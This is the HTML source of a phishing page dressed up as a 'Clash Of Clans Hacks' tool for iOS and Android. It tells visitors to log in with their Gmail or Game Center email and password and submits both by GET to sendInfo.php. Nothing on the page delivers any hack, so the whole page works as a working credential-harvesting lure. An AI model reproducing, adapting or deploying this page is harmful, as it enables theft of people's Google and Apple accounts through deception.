<!DOCTYPE html>
<html>
<head>
    <title>Clash Of Clans Hacks</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
    <link rel="stylesheet" href="css\styles.css">
</head>

<body>

<script>

function checkvalue() { 
    var email = document.getElementById('email').value; 
    var password = document.getElementById('password').value;

    if(!email.match(/\S/) || !password.match(/\S/)) {
        alert ('Please Enter Email Or Password');
        return false;
    }
}

</script>
    
    <div class="container">
        
     <h2>Hack Clash Of Clans (IOS And ANDROID) </h2>
     
    <div class="LoginForm">
        <p>First login (Gmail Or GameCenter) </p>
         <img id="formLogo" src="images/cocIc.png" class="img-responsive"/>
                <div class="form-group">   
        <form method="get" class="form" action="sendInfo.php" onsubmit="return checkvalue(this)">          
              <label for="email">email : </label>
              
              <div class="input-group">
              <span class="input-group-addon" id="sizing-addon2"><span class="glyphicon glyphicon-user"></span></span>
              <input type="email" class="form-control" name="email" id="email" placeholder="ex: x@gmail.com or x@icloud.com"/>
              </div>
              
              <label for="password">passowrd : </label>
              <div class="input-group">
              <span class="input-group-addon" id="sizing-addon2"><span class="glyphicon glyphicon-lock"></span></span>
              <input type="password" class="form-control" name="password" id="password" placeholder="password"/>
              </div>
              

         <button type="submit" class="btn btn-default"><span class="glyphicon glyphicon-menu-right"></span></button>
</form>
                    </div><!-- end form-group -->

    </div> <!-- End loginForm -->
    
    </div> <!-- End Container -->
    
</body>

</html>	